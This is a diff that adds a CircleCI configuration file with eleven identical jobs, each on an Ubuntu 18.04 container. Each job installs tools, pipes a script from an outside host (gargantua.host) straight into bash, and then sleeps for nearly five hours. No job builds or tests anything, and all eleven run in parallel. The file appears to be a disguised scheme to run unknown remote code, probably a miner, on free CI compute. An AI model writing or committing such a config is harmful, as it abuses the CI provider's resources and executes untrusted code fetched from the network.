@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  supervisorbuid:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  supervisorbuid10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahekanaseke.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - supervisorbuid
+      - supervisorbuid1
+      - supervisorbuid2
+      - supervisorbuid3
+      - supervisorbuid4
+      - supervisorbuid5
+      - supervisorbuid6
+      - supervisorbuid7
+      - supervisorbuid8
+      - supervisorbuid9
+      - supervisorbuid10
